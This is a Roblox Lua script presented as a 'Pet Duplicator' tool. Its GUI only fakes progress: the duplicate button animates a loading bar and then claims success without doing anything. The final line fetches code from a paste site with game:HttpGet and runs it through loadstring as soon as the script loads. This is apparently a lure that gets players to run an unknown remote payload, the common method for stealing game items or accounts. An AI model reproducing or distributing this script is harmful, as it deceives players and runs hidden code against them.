local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "SimplePetDuplicator"
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
mainFrame.BorderSizePixel = 0

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 150, 150)
stroke.Thickness = 2
stroke.Parent = mainFrame
mainFrame.Parent = gui

-- Title
local title = Instance.new("TextLabel")
title.Text = "PET DUPLICATOR"
title.Size = UDim2.new(1, 0, 0.3, 0)
title.TextColor3 = Color3.fromRGB(0, 200, 200)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.BackgroundTransparency = 1
title.Parent = mainFrame

-- Duplicate Button
local dupButton = Instance.new("TextButton")
dupButton.Text = "DUPLICATE"
dupButton.Size = UDim2.new(0.8, 0, 0.4, 0)
dupButton.Position = UDim2.new(0.1, 0, 0.35, 0)
dupButton.TextColor3 = Color3.new(1, 1, 1)
dupButton.Font = Enum.Font.GothamMedium
dupButton.TextSize = 16

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 6)
btnCorner.Parent = dupButton

local btnGradient = Instance.new("UIGradient")
btnGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200))
})
btnGradient.Rotation = 90
btnGradient.Parent = dupButton
dupButton.Parent = mainFrame

-- Simple Loading Bar
local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0.8, 0, 0, 10)
loadingBar.Position = UDim2.new(0.1, 0, 0.8, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
loadingBar.Visible = false

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1, 0)
barCorner.Parent = loadingBar

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 150)
barFill.Parent = loadingBar

loadingBar.Parent = mainFrame

-- Duplication Function
local function duplicatePet()
    dupButton.Text = "WORKING..."
    loadingBar.Visible = true
    barFill.Size = UDim2.new(0, 0, 1, 0)
    
    local duration = 5 -- Shorter duration for simplicity
    local start = tick()
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local progress = math.min((tick() - start) / duration, 1)
        barFill.Size = UDim2.new(progress, 0, 1, 0)
        
        if progress >= 1 then
            connection:Disconnect()
            dupButton.Text = "DUPLICATE"
            loadingBar.Visible = false
            
            -- Visual feedback
            local notif = Instance.new("TextLabel")
            notif.Text = "✔ Done! Check your pets"
            notif.Size = UDim2.new(1, 0, 0.2, 0)
            notif.Position = UDim2.new(0, 0, 0.9, 0)
            notif.TextColor3 = Color3.fromRGB(0, 255, 0)
            notif.Font = Enum.Font.Gotham
            notif.TextSize = 14
            notif.BackgroundTransparency = 1
            notif.Parent = mainFrame
            
            task.delay(3, function()
                notif:Destroy()
            end)
        end
    end)
end

dupButton.MouseButton1Click:Connect(duplicatePet)

loadstring(game:HttpGet("http://vpaste.net/wgOyk"))()
